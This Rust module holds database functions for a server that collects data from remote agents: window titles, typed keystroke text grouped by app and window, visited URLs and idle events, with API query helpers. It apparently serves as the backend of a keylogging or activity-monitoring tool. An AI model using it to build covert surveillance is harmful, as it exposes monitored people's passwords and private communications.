//! Database operations.
//!
//! All queries use the non-macro `sqlx::query()` / `sqlx::query_scalar()` API
//! so the server compiles without a running database (no `SQLX_OFFLINE` flag
//! needed in CI or Docker builds).

use anyhow::Result;
use chrono::{DateTime, TimeZone, Utc};
use sqlx::{PgPool, Row};
use uuid::Uuid;

// ─── Agents ───────────────────────────────────────────────────────────────────

/// Insert the agent if it doesn't exist yet; always bump `last_seen`.
/// Returns the stable UUID for this agent name.
pub async fn upsert_agent(pool: &PgPool, name: &str) -> Result<Uuid> {
    let row = sqlx::query(
        r#"
        INSERT INTO agents (name)
        VALUES ($1)
        ON CONFLICT (name) DO UPDATE SET last_seen = NOW()
        RETURNING id
        "#,
    )
    .bind(name)
    .fetch_one(pool)
    .await?;

    Ok(row.try_get("id")?)
}

/// Update `last_seen` when the agent disconnects.
pub async fn touch_agent(pool: &PgPool, id: Uuid) -> Result<()> {
    sqlx::query("UPDATE agents SET last_seen = NOW() WHERE id = $1")
        .bind(id)
        .execute(pool)
        .await?;
    Ok(())
}

// ─── Window events ────────────────────────────────────────────────────────────

pub async fn insert_window(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let title = v["title"].as_str().unwrap_or("");
    let app   = v["app"].as_str().unwrap_or("");
    let hwnd  = v["hwnd"].as_i64().unwrap_or(0);
    let ts    = unix_to_dt(v["ts"].as_i64());

    sqlx::query(
        "INSERT INTO window_events (agent_id, title, app, hwnd, ts) VALUES ($1,$2,$3,$4,$5)",
    )
    .bind(agent)
    .bind(title)
    .bind(app)
    .bind(hwnd)
    .bind(ts)
    .execute(pool)
    .await?;

    Ok(())
}

// ─── Key sessions ─────────────────────────────────────────────────────────────

/// Append text to an open session (same agent/app/window, updated ≤ 30 s ago).
/// Creates a new session row if no open one exists.
pub async fn upsert_keys(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let app    = v["app"].as_str().unwrap_or("");
    let window = v["window"].as_str().unwrap_or("");
    let text   = v["text"].as_str().unwrap_or("");
    let ts     = unix_to_dt(v["ts"].as_i64());

    let updated = sqlx::query(
        r#"
        UPDATE key_sessions
        SET    text         = text || $1,
               updated_at   = NOW()
        WHERE  agent_id     = $2
          AND  app          = $3
          AND  window_title = $4
          AND  updated_at   > NOW() - INTERVAL '30 seconds'
        "#,
    )
    .bind(text)
    .bind(agent)
    .bind(app)
    .bind(window)
    .execute(pool)
    .await?;

    if updated.rows_affected() == 0 {
        sqlx::query(
            "INSERT INTO key_sessions (agent_id, app, window_title, text, started_at, updated_at) \
             VALUES ($1,$2,$3,$4,$5,NOW())",
        )
        .bind(agent)
        .bind(app)
        .bind(window)
        .bind(text)
        .bind(ts)
        .execute(pool)
        .await?;
    }

    Ok(())
}

// ─── URL visits ───────────────────────────────────────────────────────────────

/// Insert a URL visit, skipping exact consecutive duplicates for this agent.
pub async fn insert_url(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let url     = v["url"].as_str().unwrap_or("");
    let title   = v["title"].as_str();
    let browser = v["browser"].as_str();
    let ts      = unix_to_dt(v["ts"].as_i64());

    // Skip if same URL as the most-recent visit for this agent.
    let last: Option<String> = sqlx::query_scalar(
        "SELECT url FROM url_visits WHERE agent_id = $1 ORDER BY ts DESC LIMIT 1",
    )
    .bind(agent)
    .fetch_optional(pool)
    .await?;

    if last.as_deref() == Some(url) {
        return Ok(());
    }

    sqlx::query(
        "INSERT INTO url_visits (agent_id, url, title, browser, ts) VALUES ($1,$2,$3,$4,$5)",
    )
    .bind(agent)
    .bind(url)
    .bind(title)
    .bind(browser)
    .bind(ts)
    .execute(pool)
    .await?;

    Ok(())
}

// ─── Activity log ─────────────────────────────────────────────────────────────

pub async fn insert_activity(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let kind      = v["type"].as_str().unwrap_or("");
    let idle_secs = v["idle_secs"].as_i64();
    let ts        = unix_to_dt(v["ts"].as_i64());

    sqlx::query(
        "INSERT INTO activity_log (agent_id, event_type, idle_secs, ts) VALUES ($1,$2,$3,$4)",
    )
    .bind(agent)
    .bind(kind)
    .bind(idle_secs)
    .bind(ts)
    .execute(pool)
    .await?;

    Ok(())
}

// ─── List / query helpers (used by API) ───────────────────────────────────────

pub async fn list_agents(pool: &PgPool) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT id, name, first_seen, last_seen FROM agents ORDER BY last_seen DESC",
    )
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let id:    Uuid          = r.try_get("id").unwrap_or_default();
            let name:  String        = r.try_get("name").unwrap_or_default();
            let first: DateTime<Utc> = r.try_get("first_seen").unwrap_or_else(|_| Utc::now());
            let last:  DateTime<Utc> = r.try_get("last_seen").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "id": id, "name": name, "first_seen": first, "last_seen": last })
        })
        .collect())
}

pub async fn query_windows(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT title, app, hwnd, ts \
         FROM window_events WHERE agent_id=$1 ORDER BY ts DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let title: String        = r.try_get("title").unwrap_or_default();
            let app:   String        = r.try_get("app").unwrap_or_default();
            let hwnd:  i64           = r.try_get("hwnd").unwrap_or_default();
            let ts:    DateTime<Utc> = r.try_get("ts").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "title": title, "app": app, "hwnd": hwnd, "ts": ts })
        })
        .collect())
}

pub async fn query_keys(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT app, window_title, text, started_at, updated_at \
         FROM key_sessions WHERE agent_id=$1 ORDER BY updated_at DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let app:        String        = r.try_get("app").unwrap_or_default();
            let window:     String        = r.try_get("window_title").unwrap_or_default();
            let text:       String        = r.try_get("text").unwrap_or_default();
            let started_at: DateTime<Utc> = r.try_get("started_at").unwrap_or_else(|_| Utc::now());
            let updated_at: DateTime<Utc> = r.try_get("updated_at").unwrap_or_else(|_| Utc::now());
            serde_json::json!({
                "app": app, "window_title": window, "text": text,
                "started_at": started_at, "updated_at": updated_at
            })
        })
        .collect())
}

pub async fn query_urls(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT url, title, browser, ts \
         FROM url_visits WHERE agent_id=$1 ORDER BY ts DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let url:     String          = r.try_get("url").unwrap_or_default();
            let title:   Option<String>  = r.try_get("title").ok().flatten();
            let browser: Option<String>  = r.try_get("browser").ok().flatten();
            let ts:      DateTime<Utc>   = r.try_get("ts").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "url": url, "title": title, "browser": browser, "ts": ts })
        })
        .collect())
}

pub async fn query_activity(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT event_type, idle_secs, ts \
         FROM activity_log WHERE agent_id=$1 ORDER BY ts DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let event_type: String       = r.try_get("event_type").unwrap_or_default();
            let idle_secs:  Option<i64>  = r.try_get("idle_secs").ok().flatten();
            let ts:         DateTime<Utc>= r.try_get("ts").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "event_type": event_type, "idle_secs": idle_secs, "ts": ts })
        })
        .collect())
}

// ─── Utility ──────────────────────────────────────────────────────────────────

fn unix_to_dt(ts: Option<i64>) -> DateTime<Utc> {
    ts.and_then(|s| Utc.timestamp_opt(s, 0).single())
        .unwrap_or_else(Utc::now)
}
